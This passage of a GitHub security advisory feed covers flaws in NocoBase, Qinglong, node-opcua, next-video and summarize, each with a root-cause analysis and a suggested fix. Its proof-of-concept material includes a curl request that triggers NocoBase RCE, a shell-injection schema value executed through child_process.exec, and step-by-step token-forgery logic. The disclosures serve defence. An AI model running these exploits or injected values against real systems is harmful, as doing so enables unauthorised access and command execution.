<pre><code class="language-bash">curl -s "http://192.168.228.130:13000/api/pm:enable?filterByTk=/home/spooky/nocobase/rce_proof.js" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInRlbXAiOnRydWUsImlhdCI6MTc3OTgzMTc1NCwic2lnbkluVGltZSI6MTc3OTgzMTc1NDE3MSwiZXhwIjoxNzc5OTE4MTU0LCJqdGkiOiJlZTJhMTU5Zi04MmE1LTQxZDctOTgyMC02ODlmOTM1Yjk2NWQifQ.Q_4m87ZDKI4bDW6QejoHYveGPNCaxzDJN-N_0B_pAfI"
</code></pre>
<p>Retrieve output via NocoBase static file serving</p>
<img width="832" height="214" alt="image" src="https://github.com/user-attachments/assets/1ed60982-fc93-48f0-8b34-4bae0412ced2">

<img width="810" height="96" alt="image" src="https://github.com/user-attachments/assets/15241236-2701-4488-a9a9-a504c9505562">
### References

<ul>
<li><a href="https://github.com/nocobase/nocobase/security/advisories/GHSA-ghvf-qf6h-g8x5">https://github.com/nocobase/nocobase/security/advisories/GHSA-ghvf-qf6h-g8x5</a></li>
<li><a href="https://github.com/nocobase/nocobase/pull/9628">https://github.com/nocobase/nocobase/pull/9628</a></li>
<li><a href="https://github.com/nocobase/nocobase/pull/9701">https://github.com/nocobase/nocobase/pull/9701</a></li>
<li><a href="https://github.com/nocobase/nocobase/commit/7c9ffe1427a529d62576b83c35222ba7ef9b8d11">https://github.com/nocobase/nocobase/commit/7c9ffe1427a529d62576b83c35222ba7ef9b8d11</a></li>
<li><a href="https://github.com/nocobase/nocobase/commit/a89e5a999b608bcb4ec67a845e924af0fb58a7c7">https://github.com/nocobase/nocobase/commit/a89e5a999b608bcb4ec67a845e924af0fb58a7c7</a></li>
<li><a href="https://github.com/advisories/GHSA-ghvf-qf6h-g8x5">https://github.com/advisories/GHSA-ghvf-qf6h-g8x5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghvf-qf6h-g8x5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-20T18:42:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@whyour/qinglong] Qinglong has an incomplete fix for CVE-2026-3965: Improper Authentication]]></title>
        <id>https://github.com/advisories/GHSA-v667-gc2r-2xm7</id>
        <link href="https://github.com/advisories/GHSA-v667-gc2r-2xm7"/>
        <updated>2026-08-20T18:37:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The init guard middleware in Qinglong only checks <code>/api/user/init</code> paths but not <code>/open/user/init</code>, which is whitelisted from JWT authentication and rewritten to <code>/api/user/init</code> after the guard has already passed, allowing unauthenticated admin credential reset on initialized instances.</p>
<h3 id="affected-package">Affected Package</h3>
<ul>
<li><strong>Ecosystem:</strong> npm</li>
<li><strong>Package:</strong> whyour/qinglong</li>
<li><strong>Affected versions:</strong> &lt; 6bec52dca158</li>
<li><strong>Patched versions:</strong> &gt;= 6bec52dca158</li>
</ul>
<h3 id="severity">Severity</h3>
<p>Medium</p>
<h3 id="cwe">CWE</h3>
<p>CWE-287 — Improper Authentication</p>
<h3 id="details">Details</h3>
<p>The Qinglong panel has an initialization endpoint (<code>/api/user/init</code>) that allows setting admin credentials. Once the system is initialized, an init guard middleware is supposed to block further calls. The middleware in <code>back/loaders/express.ts</code> only checks:</p>
<pre><code class="language-javascript">!['/api/user/init', '/api/user/notification/init'].includes(pathLower)
</code></pre>
<p>However, the application also has a URL rewrite rule: <code>rewrite('/open/*', '/api/$1')</code>. The <code>/open/*</code> paths are whitelisted from JWT authentication.</p>
<p>The middleware ordering creates the bypass: first, JWT auth sees <code>/open/*</code> paths match the whitelist regex and skips authentication. Second, the init guard only checks for <code>/api/user/init</code> -- <code>/open/user/init</code> passes through as "not an init path". Third, the URL rewrite transforms <code>/open/user/init</code> to <code>/api/user/init</code> after the guard has already passed.</p>
<p>This means an unauthenticated attacker can send <code>PUT /open/user/init</code> with new credentials to reset the admin account on any Qinglong panel instance, gaining full administrative access.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">/**
 * CVE-2026-3965 - Qinglong Panel /open/user/init Auth Bypass
 *
 * The init guard middleware only checks /api/user/init paths.
 * But /open/user/init is whitelisted from JWT auth and rewritten
 * to /api/user/init via express-urlrewrite AFTER the guard.
 */

"use strict";

// Simulate the init guard middleware exactly as in the source
function initGuardMiddleware(reqPath, authInfo) {
  const pathLower = reqPath.toLowerCase();
  // Exact check from the vulnerable source
  if (!['/api/user/init', '/api/user/notification/init'].includes(pathLower)) {
    return { action: "next" }; // passes through
  }

  let isInitialized = true;
  if (
    Object.keys(authInfo).length === 2 &amp;&amp;
    authInfo.username === 'admin' &amp;&amp;
    authInfo.password === 'admin'
  ) {
    isInitialized = false;
  }

  if (isInitialized) {
    return { action: "block", code: 450, message: "Error" };
  } else {
    return { action: "next" };
  }
}

const authInfo = { username: "realAdmin", password: "str0ngP@ss!" };
console.log("System state: initialized (non-default credentials)");

// Test 1: Direct /api/user/init is blocked
const test1 = initGuardMiddleware("/api/user/init", authInfo);
console.log("\n[Test 1] PUT /api/user/init:");
console.log("  Guard result:", test1.action);
console.log("  Blocked:", test1.action === "block");

// Test 2: /open/user/init BYPASSES init guard
const test2 = initGuardMiddleware("/open/user/init", authInfo);
console.log("\n[Test 2] PUT /open/user/init:");
console.log("  Guard result:", test2.action);
console.log("  Bypassed guard:", test2.action === "next");

if (test2.action === "next") {
  const rewrittenPath = "/open/user/init".replace(/^\/open\//, "/api/");
  console.log("  After rewrite:", rewrittenPath);
  console.log("  Reaches init handler: true");
}

if (test1.action === "block" &amp;&amp; test2.action === "next") {
  console.log("\nVULNERABILITY CONFIRMED: /open/user/init bypasses the init guard");
  console.log("An attacker can reset admin credentials on an initialized instance.");
  process.exit(0);
} else {
  console.log("\nVULNERABILITY NOT CONFIRMED");
  process.exit(1);
}
</code></pre>
<p><strong>Steps to reproduce:</strong></p>
<ol>
<li><code>git clone https://github.com/whyour/qinglong /tmp/qinglong_test</code></li>
<li><code>cd /tmp/qinglong_test &amp;&amp; git checkout 6bec52dc~1</code></li>
<li><code>node poc.js</code></li>
</ol>
<p><strong>Expected output:</strong></p>
<pre><code>VULNERABILITY CONFIRMED
/open/user/init bypasses the init guard; the guard only checks /api/user/init but /open/ path is whitelisted and rewritten after.
</code></pre>
<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can send <code>PUT /open/user/init</code> with new credentials to reset the admin account on any Qinglong panel instance. This provides full administrative access, enabling the attacker to execute arbitrary cron jobs and scripts on the server.</p>
<h3 id="suggested-remediation">Suggested Remediation</h3>
<p>Add <code>/open/user/init</code> and <code>/open/user/notification/init</code> to the init guard check list. Alternatively, move the URL rewrite middleware to run before the init guard. Consider implementing the init guard at the handler level rather than as path-based middleware.</p>
<h3 id="references">References</h3>
<ul>
<li>Incomplete fix commit: <a href="https://github.com/whyour/qinglong/commit/6bec52dca158481258315ba0fc2f11206df7b719">https://github.com/whyour/qinglong/commit/6bec52dca158481258315ba0fc2f11206df7b719</a></li>
<li>Original CVE: CVE-2026-3965</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/whyour/qinglong/security/advisories/GHSA-v667-gc2r-2xm7">https://github.com/whyour/qinglong/security/advisories/GHSA-v667-gc2r-2xm7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55445">https://nvd.nist.gov/vuln/detail/CVE-2026-55445</a></li>
<li><a href="https://github.com/whyour/qinglong/pull/2941">https://github.com/whyour/qinglong/pull/2941</a></li>
<li><a href="https://github.com/whyour/qinglong/commit/6bec52dca158481258315ba0fc2f11206df7b719">https://github.com/whyour/qinglong/commit/6bec52dca158481258315ba0fc2f11206df7b719</a></li>
<li><a href="https://github.com/advisories/GHSA-v667-gc2r-2xm7">https://github.com/advisories/GHSA-v667-gc2r-2xm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v667-gc2r-2xm7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-20T18:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-opcua] node-opcua missing nonce verification in UserNameIdentityToken authentication]]></title>
        <id>https://github.com/advisories/GHSA-mq36-523m-x7vv</id>
        <link href="https://github.com/advisories/GHSA-mq36-523m-x7vv"/>
        <updated>2026-08-20T18:36:02.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Summary</strong>
A missing nonce verification in the UserNameIdentityToken authentication handler allows an unauthenticated remote attacker to forge a password token that extracts as an empty string, and to replay captured authentication tokens across sessions.</p>
<p><strong>Affected versions:</strong> &lt;= 2.165.0
<strong>Tested version:</strong> 2.165.0
<strong>CVSS Score:</strong> 8.1 (High)
<strong>CVSS Vector:</strong> CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L
<strong>CWE:</strong> CWE-347 Improper Verification of Cryptographic Signature</p>
<hr>
<p><strong>Root Cause</strong></p>
<p>In <code>packages/node-opcua-server/source/opcua_server.ts</code> at line 1886-1887, after RSA-OAEP decrypting the UserNameIdentityToken password blob, the server reads a 4-byte little-endian length field and extracts <code>buff[4 : 4+length]</code> as the password. It never verifies that the trailing bytes equal <code>session.nonce</code>.</p>
<p>This has two consequences:</p>
<ol>
<li><p><strong>Forged empty password:</strong> An attacker who retrieves the server's public key via an unauthenticated <code>GetEndpoints</code> call can craft a token where the 4-byte length field equals <code>serverNonce.length</code> (32). The server computes <code>length = 32 - 32 = 0</code> and calls <code>isValidUser(username, "")</code>. Any account that accepts an empty password is compromised.</p>
</li>
<li><p><strong>Unconditional replay attack:</strong> Because nonce binding is structurally absent, any captured UserNameIdentityToken ciphertext can be replayed in a different session unconditionally.</p>
</li>
</ol>
<p>The impact is compounded by a second issue: when the channel uses <code>SecurityMode=None</code>, <code>verifyClientSignature</code> returns <code>true</code> unconditionally (security_policy.ts:697-700), bypassing the channel-level signature check entirely.</p>
<hr>
<p><strong>Proof of Concept (logic, no exploit code)</strong></p>
<pre><code>1. GetEndpoints (unauthenticated) → retrieve server public key and RSA token policy
2. OpenSecureChannel (SecurityMode=None)
3. CreateSession
4. Craft plaintext: [0x20, 0x00, 0x00, 0x00]  (readUInt32LE = 32 = serverNonce.length)
5. RSA-OAEP encrypt with server public key → 256-byte ciphertext
6. ActivateSession with crafted UserNameIdentityToken
7. Server decrypts → length = 32 - 32 = 0 → password = ""
8. isValidUser(username, "") is called
</code></pre>
<p>Dynamically confirmed: decryption produces <code>password = ""</code> with no error and no nonce verification.</p>
<hr>
<p><strong>Suggested Fix</strong></p>
<p>After decrypting the password blob, verify that <code>buff.slice(4 + passwordLength)</code> equals <code>session.nonce</code> before extracting the password. Reject the token if verification fails.</p>
<hr>
<p>I am following a 90-day responsible disclosure policy. I am happy to provide additional technical details under embargo. Please confirm receipt at your earliest convenience.</p>
<p>Reporter: Stanley Tobias
Discovery date: 2026-03-23</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-opcua/node-opcua/security/advisories/GHSA-mq36-523m-x7vv">https://github.com/node-opcua/node-opcua/security/advisories/GHSA-mq36-523m-x7vv</a></li>
<li><a href="https://github.com/advisories/GHSA-mq36-523m-x7vv">https://github.com/advisories/GHSA-mq36-523m-x7vv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq36-523m-x7vv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-20T18:35:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next-video] next-video: Unauthenticated arbitrary file read via /api/video request handler]]></title>
        <id>https://github.com/advisories/GHSA-2p39-2jf3-fv2q</id>
        <link href="https://github.com/advisories/GHSA-2p39-2jf3-fv2q"/>
        <updated>2026-08-20T18:36:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The HTTP route handler exported by <code>next-video/request-handler</code> — which the README instructs consumers to mount at <code>/api/video</code> — allows an unauthenticated remote attacker to read arbitrary <code>.json</code> files from the production filesystem of any application following the documented setup.</p>
<p>The handler's <code>GET</code> endpoint accepts a <code>url</code> query parameter and uses it to locate and serve a JSON asset descriptor from disk. The only guard between "remote URL" and "local file path" is a regex check for <code>^https?://</code>. Any value that does not match that prefix is treated as a local path, <code>.json</code> is appended, and the file is read with <code>fs.readFile</code> and returned in the HTTP response — with no authentication, no path canonicalization, and no traversal guard.</p>
<p>On a typical Next.js deployment this exposes, at minimum:</p>
<ul>
<li>The <strong>Next.js Server Actions AES encryption key</strong> (<code>.next/server/server-reference-manifest.json</code>)</li>
<li>The <strong>Next.js Preview/Draft Mode keys</strong> (<code>previewModeId</code>, <code>previewModeSigningKey</code>, <code>previewModeEncryptionKey</code>)</li>
<li>Internal build manifests, route registries, and absolute runtime paths</li>
<li>Application-specific asset metadata (e.g. Mux <code>uploadId</code>, <code>assetId</code>, <code>playbackId</code> values stored in <code>videos/*.json</code>)</li>
</ul>
<p>Any application that mounted <code>/api/video</code> following the documented one-liner is affected.</p>
<h3 id="patches">Patches</h3>
<p>2.8.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>Until a patched version is available, wrap the exported handler in your own route file and validate the <code>url</code> parameter before passing it through:</p>
<ul>
<li>Reject any <code>url</code> value that does not begin with <code>https://</code>, or that does not match a known allowlist of trusted remote hosts.</li>
<li>Alternatively, remove the <code>/api/video</code> route entirely if your application only uses build-time <code>import</code> of local video files and does not use <code>&lt;Video src="https://..."&gt;</code> with string URLs at runtime.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><code>src/request-handler.ts</code> — the vulnerable GET handler</li>
<li><code>src/assets.ts</code> — <code>getAssetPath()</code>, where the local-vs-remote branching occurs</li>
<li><code>src/utils/utils.ts</code> — <code>isRemote()</code>, the sole guard between the two branches</li>
<li><code>src/config.ts</code> — <code>loadAsset()</code>, which performs the unconstrained <code>fs.readFile</code></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/muxinc/next-video/security/advisories/GHSA-2p39-2jf3-fv2q">https://github.com/muxinc/next-video/security/advisories/GHSA-2p39-2jf3-fv2q</a></li>
<li><a href="https://github.com/muxinc/next-video/commit/73abf1d534c2ac48db546ecfed0e89cbaf124f6f">https://github.com/muxinc/next-video/commit/73abf1d534c2ac48db546ecfed0e89cbaf124f6f</a></li>
<li><a href="https://github.com/muxinc/next-video/releases/tag/v2.8.1">https://github.com/muxinc/next-video/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/advisories/GHSA-2p39-2jf3-fv2q">https://github.com/advisories/GHSA-2p39-2jf3-fv2q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2p39-2jf3-fv2q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-20T18:35:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-opcua] node-opcua: Unbounded nonce cache enables unauthenticated heap exhaustion DoS]]></title>
        <id>https://github.com/advisories/GHSA-6wvw-vrw4-363w</id>
        <link href="https://github.com/advisories/GHSA-6wvw-vrw4-363w"/>
        <updated>2026-08-20T18:36:01.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Summary</strong>
A process-global nonce cache with no eviction policy allows an unauthenticated remote attacker to exhaust server heap memory by repeatedly opening sessions, causing the node-opcua server process to crash.</p>
<p><strong>Affected versions:</strong> &lt;= 2.165.0
<strong>Tested version:</strong> 2.165.0
<strong>CVSS Score:</strong> 7.5 (High)
<strong>CVSS Vector:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
<strong>CWE:</strong> CWE-770 Allocation of Resources Without Limits or Throttling</p>
<hr>
<p><strong>Root Cause</strong></p>
<p>In <code>packages/node-opcua-secure-channel/source/server/server_secure_channel_layer.ts</code> at line 156, <code>g_alreadyUsedNonce</code> is a process-global object used to track previously seen nonces for replay detection. Entries are added on every <code>OpenSecureChannelRequest</code> and every <code>CreateSession</code> request but are never removed or expired.</p>
<p>An unauthenticated attacker can exploit the <code>CreateSession</code> path (which requires no certificate) to accumulate nonce entries indefinitely. Even with <code>maxSessions=10</code> limiting concurrent sessions, nonces persist after session expiry, allowing slow but reliable heap exhaustion across repeated connection cycles.</p>
<hr>
<p><strong>Measured Impact</strong></p>
<p>Dynamically confirmed heap growth:</p>
<ul>
<li>5,000 unique nonces → +1.23 MB resident heap, no eviction after explicit GC</li>
<li>Projected: 10^6 nonces → ~246 MB resident heap</li>
<li>Achievable OOM on default Node.js heap limits</li>
</ul>
<hr>
<p><strong>Suggested Fix</strong></p>
<p>Add a TTL-based eviction policy to <code>g_alreadyUsedNonce</code>. Nonces should be expired after the maximum session timeout (or a reasonable fixed window, e.g. 1 hour). A Map with timestamp entries and periodic cleanup is sufficient.</p>
<hr>
<p>I am following a 90-day responsible disclosure policy. I am happy to provide additional technical details under embargo. Please confirm receipt at your earliest convenience.</p>
<p>Reporter: Stanley Tobias
Discovery date: 2026-03-23</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-opcua/node-opcua/security/advisories/GHSA-6wvw-vrw4-363w">https://github.com/node-opcua/node-opcua/security/advisories/GHSA-6wvw-vrw4-363w</a></li>
<li><a href="https://github.com/node-opcua/node-opcua/releases/tag/v2.168.0">https://github.com/node-opcua/node-opcua/releases/tag/v2.168.0</a></li>
<li><a href="https://github.com/advisories/GHSA-6wvw-vrw4-363w">https://github.com/advisories/GHSA-6wvw-vrw4-363w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6wvw-vrw4-363w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-20T18:35:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@steipete/summarize] @steipete/summarize vulnerable to SSRF via podcast:transcript URL fetch]]></title>
        <id>https://github.com/advisories/GHSA-3vx2-vqx8-jxfg</id>
        <link href="https://github.com/advisories/GHSA-3vx2-vqx8-jxfg"/>
        <updated>2026-08-20T18:33:58.000Z</updated>
        <content type="html"><![CDATA[<p>Summarize before 0.17.0 contains a server-side request forgery vulnerability that allows attackers who control a podcast RSS feed to direct the host to fetch transcript content from loopback addresses, link-local addresses, RFC 1918 private ranges, or other reserved destinations by supplying malicious podcast:transcript URL values. Attackers can bypass protections through DNS rebinding and redirect-based techniques, as redirect targets are not revalidated and hostnames are not resolved before request dispatch, exposing internal service responses through the summarization flow.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53782">https://nvd.nist.gov/vuln/detail/CVE-2026-53782</a></li>
<li><a href="https://github.com/steipete/summarize/pull/239">https://github.com/steipete/summarize/pull/239</a></li>
<li><a href="https://github.com/steipete/summarize/commit/3c5522440c4833dde033e226baa39e6dda1dfc75">https://github.com/steipete/summarize/commit/3c5522440c4833dde033e226baa39e6dda1dfc75</a></li>
<li><a href="https://github.com/steipete/summarize/releases/tag/v0.17.0">https://github.com/steipete/summarize/releases/tag/v0.17.0</a></li>
<li><a href="https://www.vulncheck.com/advisories/summarize-ssrf-via-podcast-transcript-url-fetch">https://www.vulncheck.com/advisories/summarize-ssrf-via-podcast-transcript-url-fetch</a></li>
<li><a href="https://github.com/advisories/GHSA-3vx2-vqx8-jxfg">https://github.com/advisories/GHSA-3vx2-vqx8-jxfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3vx2-vqx8-jxfg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-11T21:31:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nocobase/plugin-backups] NocoBase backup restore schema name allows command injection]]></title>
        <id>https://github.com/advisories/GHSA-p853-83gj-wjj3</id>
        <link href="https://github.com/advisories/GHSA-p853-83gj-wjj3"/>
        <updated>2026-08-20T18:30:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>NocoBase <code>@nocobase/plugin-backups</code> 2.0.57 restores PostgreSQL backups by interpolating the backup metadata schema name into shell command strings that are executed with Node.js <code>child_process.exec()</code>. A backup-management user who can restore an uploaded PostgreSQL backup with forced schema restore can place shell metacharacters in <code>_metadata.json</code> under <code>database.schema</code>, causing arbitrary commands to execute as the NocoBase server process during restore.</p>
<p>The vulnerable plugin is included in the default <code>@nocobase/preset-nocobase</code> package and is guarded by the backup-management ACL snippet (<code>backups:*</code> / <code>backup:*</code>). This is not unauthenticated; the attacker must have backup restore privileges or equivalent access to the restore API/CLI.</p>
<h3 id="details">Details</h3>
<p>Affected product evidence:</p>
<ul>
<li>Ecosystem/package: npm package <code>@nocobase/plugin-backups</code> from <code>packages/plugins/@nocobase/plugin-backups/package.json</code>.</li>
<li>Tested vulnerable version: <code>2.0.57</code> (<code>packages/plugins/@nocobase/plugin-backups/package.json:1-16</code>).</li>
<li>Tested commit: <code>e03d267362b3426f484c28783020b4a2a08911e8</code>.</li>
<li>Default/common inclusion: <code>@nocobase/preset-nocobase</code> depends on and lists <code>@nocobase/plugin-backups</code> 2.0.57 as built in (<code>packages/presets/nocobase/package.json:22-24</code>, <code>packages/presets/nocobase/package.json:115-128</code>).</li>
<li>Affected range estimate: at least the tested <code>2.0.57</code> checkout. Earlier/later versions were not tested.</li>
<li>Patched version: unknown/not available in this local checkout.</li>
</ul>
<p>Source-to-sink path:</p>
<ul>
<li>The plugin registers backup-management snippets for <code>backups:*</code> and <code>backup:*</code>, so the restore API is intended for roles granted backup-management permissions (<code>packages/plugins/@nocobase/plugin-backups/src/server/plugin.ts:51-59</code>).</li>
<li>The <code>backup</code> restore-upload action accepts request body/query <code>force</code> and passes it as <code>forceSchemaRestore</code> to <code>RestoreManager.restore()</code> (<code>packages/plugins/@nocobase/plugin-backups/src/server/resourcers/backup-cli.ts:40-42</code>, <code>packages/plugins/@nocobase/plugin-backups/src/server/resourcers/backup-cli.ts:200-211</code>).</li>
<li><code>RestoreManager</code> decompresses the uploaded backup archive, reads <code>_metadata.json</code>, and parses attacker-controlled JSON metadata (<code>packages/plugins/@nocobase/plugin-backups/src/server/managers/restore.ts:203-215</code>, <code>packages/plugins/@nocobase/plugin-backups/src/server/managers/restore.ts:257-267</code>).</li>
<li>When <code>forceSchemaRestore</code> is true and the database dialect is PostgreSQL, the schema-mismatch check is skipped (<code>packages/plugins/@nocobase/plugin-backups/src/server/managers/restore.ts:270-300</code>). Existing tests confirm forced schema restore intentionally allows a metadata schema mismatch (<code>packages/plugins/@nocobase/plugin-backups/src/server/__tests__/managers/restore.test.ts:336-356</code>) and that the API passes <code>forceSchemaRestore: true</code> when <code>force=true</code> is supplied (<code>packages/plugins/@nocobase/plugin-backups/src/server/__tests__/managers/restore.test.ts:377-409</code>).</li>
<li>The parsed <code>metadata.database.schema</code> is passed into <code>this.#dbAdapter.restore(path.join(extractedDir, dbFile), metadata.database.schema)</code> (<code>packages/plugins/@nocobase/plugin-backups/src/server/managers/restore.ts:427-448</code>).</li>
<li>For PostgreSQL, if the backup schema differs from the target schema, <code>PostgresAdapter.restore()</code> assigns <code>srcSchema = schema || 'public'</code> and builds <code>pgRestoreCommand</code> using <code>-n ${srcSchema}</code> with no quoting or argument array (<code>packages/plugins/@nocobase/plugin-backups/src/server/adapters/database.ts:350-420</code>).</li>
<li><code>#restoreSchema()</code> also interpolates <code>srcSchema</code> and <code>targetSchema</code> directly into SQL strings and then calls <code>run(pgRestoreCommand, ...)</code> (<code>packages/plugins/@nocobase/plugin-backups/src/server/adapters/database.ts:423-451</code>).</li>
<li><code>run()</code> executes the assembled string through <code>child_process.exec()</code>, which invokes a shell (<code>packages/plugins/@nocobase/plugin-backups/src/server/adapters/database.ts:1-31</code>).</li>
</ul>
<p>A schema value such as <code>safe; touch /tmp/nocobase-cve-marker #</code> produces a restore command of this form:</p>
<pre><code class="language-text">pg_restore -U u -h localhost -p 5432 -n safe; touch /tmp/nocobase-cve-marker # -d db --clean --if-exists --no-owner -j 1 /tmp/backup-data
</code></pre>
<p>The semicolon terminates the intended <code>pg_restore</code> command and starts a new shell command.</p>
<p>False-positive screening:</p>
<ul>
<li>This report does not claim unauthenticated exploitation. The route is gated by backup-management permissions through the registered ACL snippet.</li>
<li>The older <code>backups.upload</code> resource path was reviewed and does not pass <code>forceSchemaRestore</code>; the directly confirmed force path is the <code>backup.restoreUpload</code> / backup-CLI API path (<code>packages/plugins/@nocobase/plugin-backups/src/server/resourcers/backups.ts:54-77</code>, <code>packages/plugins/@nocobase/plugin-backups/src/server/resourcers/backup-cli.ts:200-211</code>).</li>
<li>The schema mismatch check blocks mismatched metadata by default, but it is deliberately bypassed for PostgreSQL when the supported force option is true.</li>
<li>The command injection is in the shell command itself before any PostgreSQL connection or valid backup file is required; the safe PoC proves shell metacharacter execution locally without connecting to a database.</li>
<li>The finding is not based on existing reports or generated writeups.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>The following local-only PoC renders the same vulnerable <code>pg_restore</code> command shape built by <code>PostgresAdapter.restore()</code> and executes it through Node.js <code>child_process.exec()</code>, the sink used by the plugin. It uses a harmless marker file under <code>/tmp</code>, does not contact external services, and cleans up after itself.</p>
<p>From a clean checkout of the tested commit:</p>
<pre><code class="language-bash">cd nocobase
rm -f /tmp/nocobase-cve-marker
node - &lt;&lt;'NODE'
const { exec } = require('child_process');

const schemaFromBackupMetadata = 'safe; touch /tmp/nocobase-cve-marker #';
const command = `pg_restore -U u -h localhost -p 5432 -n ${schemaFromBackupMetadata} -d db --clean --if-exists --no-owner -j 1 /tmp/backup-data`;

exec(command, () =&gt; {
  const fs = require('fs');
  console.log(fs.existsSync('/tmp/nocobase-cve-marker') ? 'marker-created' : 'marker-missing');
  fs.rmSync('/tmp/nocobase-cve-marker', { force: true });
});
NODE
</code></pre>
<p>Observed output in this environment:</p>
<pre><code class="language-text">marker-created
</code></pre>
<p>Expected vulnerable output: <code>marker-created</code>, proving the schema value starts a second shell command.</p>
<p>Negative/control case: replace <code>schemaFromBackupMetadata</code> with <code>safe_schema</code>; the same harness should print <code>marker-missing</code> because no shell metacharacter starts the <code>touch</code> command.</p>
<p>Maintainer-runnable application-level trigger:</p>
<ol>
<li>Run NocoBase 2.0.57 with PostgreSQL and the built-in <code>@nocobase/plugin-backups</code> enabled.</li>
<li>Use a role granted the backup-management snippet/actions (<code>backups:*</code> / <code>backup:*</code>).</li>
<li>Create a NocoBase backup archive containing a <code>data</code> member and <code>_metadata.json</code> with matching dialect/table settings but <code>database.schema</code> set to <code>safe; touch /tmp/nocobase-cve-marker #</code>.</li>
<li>Restore the uploaded backup through the <code>backup</code> restore-upload path with <code>force=true</code> so PostgreSQL schema mismatch is allowed.</li>
<li>Vulnerable behavior: <code>/tmp/nocobase-cve-marker</code> exists on the server after restore begins, even if <code>pg_restore</code> or database connection later fails.</li>
<li>Cleanup: remove <code>/tmp/nocobase-cve-marker</code> and discard the test database/container.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>A user with backup restore privileges can execute arbitrary shell commands as the NocoBase server OS user. In a typical server or container deployment, this can read application configuration and environment secrets, modify application files or database backups, run network clients from the server, and disrupt service availability.</p>
<p>The required application privilege is high because backup restore is an administrative operation. However, backup-management permission is still an application-level role boundary; it should not imply arbitrary operating-system command execution.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Do not execute database tools through shell-interpreted command strings. Use <code>spawn()</code> or <code>execFile()</code> with an argument array for <code>pg_restore</code>, <code>psql</code>, <code>pg_dump</code>, <code>mysql</code>, and related tools. Validate PostgreSQL schema identifiers from backup metadata against PostgreSQL identifier rules or quote them using the database driver's identifier-quoting facilities before using them in SQL.</p>
<p>For this specific path:</p>
<ul>
<li>Pass <code>pg_restore</code> arguments as an array, for example <code>['-U', username, '-h', host, '-p', String(port), '-n', srcSchema, '-d', database, ...]</code>.</li>
<li>Reject schema names containing shell metacharacters, quotes, whitespace, comments, or characters outside accepted PostgreSQL identifier syntax unless they are safely handled as identifiers.</li>
<li>Replace dynamic SQL string interpolation in <code>#restoreSchema()</code> with identifier-safe quoting (<code>format('%I', ...)</code> in PostgreSQL or equivalent server-side parameters) and string-literal escaping where literals are required.</li>
<li>Add regression tests that restore a backup whose metadata schema contains <code>; touch /tmp/should-not-exist #</code> and assert no marker file is created and the request is rejected.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocobase/nocobase/security/advisories/GHSA-p853-83gj-wjj3">https://github.com/nocobase/nocobase/security/advisories/GHSA-p853-83gj-wjj3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55410">https://nvd.nist.gov/vuln/detail/CVE-2026-55410</a></li>
<li><a href="https://github.com/nocobase/nocobase/commit/0e1aba1b7b112ffc841588963f7343c00edd9806">https://github.com/nocobase/nocobase/commit/0e1aba1b7b112ffc841588963f7343c00edd9806</a></li>
<li><a href="https://github.com/nocobase/nocobase/releases/tag/v2.1.19">https://github.com/nocobase/nocobase/releases/tag/v2.1.19</a></li>
<li><a href="https://github.com/advisories/GHSA-p853-83gj-wjj3">https://github.com/advisories/GHSA-p853-83gj-wjj3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
